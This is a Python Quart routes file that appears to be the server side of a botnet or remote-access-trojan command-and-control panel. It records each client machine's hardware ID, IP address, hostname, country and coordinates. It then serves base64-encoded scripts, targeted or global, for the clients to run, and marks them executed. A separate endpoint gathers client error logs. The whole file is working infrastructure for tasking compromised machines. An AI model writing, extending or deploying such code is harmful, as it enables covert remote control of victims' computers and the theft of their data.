import base64
import datetime
import aiosqlite
import html
from quart import request, jsonify

from config import DATABASE
from util.rate_limit import api_rate_limit


def sanitize_input(value):
    if isinstance(value, str):
        return html.escape(value)
    return value


def register_client_routes(app):
    """Register client API routes with the app"""

    @app.route("/api/client/<base64_hwid>", methods=["POST", "GET"])
    @api_rate_limit()
    async def client_endpoint(base64_hwid):
        """Unified endpoint for client communication - handles both registration and command fetching"""
        try:

            hwid = base64.b64decode(base64_hwid).decode("utf-8")
            client_ip = request.remote_addr

            if request.method == "POST":

                if not request.is_json:
                    return (
                        jsonify(
                            {"status": "error", "message": "Invalid request format"}
                        ),
                        400,
                    )

                client_data = await request.get_json()

                if "PCINFO" in client_data:
                    pcinfo = client_data["PCINFO"]
                    country_code = sanitize_input(pcinfo.get("country_code", "Unknown"))
                    hostname = sanitize_input(
                        pcinfo.get("hostname", f"unknown-{client_ip}")
                    )
                    latitude = float(pcinfo.get("lat", 0.0))
                    longitude = float(pcinfo.get("lon", 0.0))

                    async with aiosqlite.connect(DATABASE) as db:

                        async with db.execute(
                            "SELECT id FROM user WHERE hwid = ?", [hwid]
                        ) as cursor:
                            user = await cursor.fetchone()

                        if user:

                            await db.execute(
                                """
                                UPDATE user 
                                SET last_ping = CURRENT_TIMESTAMP, 
                                    is_active = 1,
                                    ip_address = ?,
                                    country = ?,
                                    hostname = ?,
                                    latitude = ?,
                                    longitude = ?
                                WHERE hwid = ?
                                """,
                                [
                                    client_ip,
                                    country_code,
                                    hostname,
                                    latitude,
                                    longitude,
                                    hwid,
                                ],
                            )
                            await db.commit()

                            return jsonify(
                                {
                                    "status": "success",
                                    "message": "Ping received",
                                    "user_type": "existing",
                                    "new_run": False,
                                    "scripts": [],
                                }
                            )
                        else:

                            await db.execute(
                                """
                                INSERT INTO user 
                                (pcname, ip_address, country, latitude, longitude, last_ping, first_ping, is_active, hwid, hostname) 
                                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, ?, ?)
                                """,
                                [
                                    hostname,
                                    client_ip,
                                    country_code,
                                    latitude,
                                    longitude,
                                    hwid,
                                    hostname,
                                ],
                            )
                            await db.commit()

                            return jsonify(
                                {
                                    "status": "success",
                                    "message": "New client registered",
                                    "user_type": "new",
                                    "auto_load": False,
                                    "auto_load_script": [],
                                    "new_run": False,
                                    "scripts": [],
                                }
                            )

                return (
                    jsonify({"status": "error", "message": "Invalid data format"}),
                    400,
                )

            else:  # get requests

                async with aiosqlite.connect(DATABASE) as db:
                    db.row_factory = aiosqlite.Row

                    async with db.execute(
                        "SELECT id FROM user WHERE hwid = ?", [hwid]
                    ) as cursor:
                        user = await cursor.fetchone()

                    if not user:
                        return (
                            jsonify({"status": "error", "message": "Unknown client"}),
                            404,
                        )

                    await db.execute(
                        """
                        UPDATE user 
                        SET last_ping = CURRENT_TIMESTAMP, 
                            is_active = 1
                        WHERE hwid = ?
                        """,
                        [hwid],
                    )
                    await db.commit()

                    async with db.execute(
                        """
                        SELECT s.id, s.content
                        FROM scripts s
                        JOIN user u ON s.user_id = u.id
                        WHERE u.hwid = ? AND s.executed = 0
                        
                        UNION
                        
                        SELECT s.id, s.content
                        FROM scripts s
                        WHERE s.is_global = 1 AND s.executed = 0
                        
                        ORDER BY id DESC
                        """,
                        [hwid],
                    ) as cursor:
                        scripts = await cursor.fetchall()

                    script_list = []
                    for script in scripts:
                        script_content = script["content"]
                        script_base64 = base64.b64encode(
                            script_content.encode()
                        ).decode()
                        script_list.append(script_base64)

                        await db.execute(
                            "UPDATE scripts SET executed = 1 WHERE id = ?",
                            [script["id"]],
                        )

                    await db.commit()

                    return jsonify(
                        {
                            "status": "success",
                            "new_run": len(script_list) > 0,
                            "scripts": script_list,
                        }
                    )

        except Exception as e:
            print(f"Error processing client request: {e}")
            return jsonify({"status": "error", "message": "Server error"}), 500

    @app.route("/log", methods=["POST"])
    @api_rate_limit()
    async def client_log():
        """Endpoint for clients to send log messages"""
        if not request.is_json:
            return (
                jsonify({"status": "error", "message": "Invalid request format"}),
                400,
            )

        try:
            log_data = await request.get_json()
            hwid = sanitize_input(log_data.get("HWID", ""))
            error_message = sanitize_input(log_data.get("error_message", ""))
            log_type = sanitize_input(log_data.get("type", ""))

            print(f"Client log from {hwid}: [{log_type}] {error_message}")

            return jsonify({"status": "success"})

        except Exception as e:
            print(f"Error processing client log: {e}")
            return jsonify({"status": "error", "message": "Server error"}), 500

    return app
